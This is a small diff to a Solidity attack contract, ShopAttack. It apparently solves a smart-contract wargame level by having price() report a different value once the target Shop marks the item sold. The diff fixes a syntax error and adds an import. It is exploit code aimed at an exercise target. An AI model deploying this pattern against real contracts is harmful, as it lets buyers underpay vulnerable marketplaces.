@@ -1,6 +1,8 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+import "./Shop.sol";
+
 contract ShopAttack is Buyer {
     Shop public target;
 
@@ -13,6 +15,6 @@ contract ShopAttack is Buyer {
     }
 
     function price() public view override returns (uint256) {
-        return.target.isSold() ? 0 : 100;
+        return target.isSold() ? 0 : 100;
     }
 }
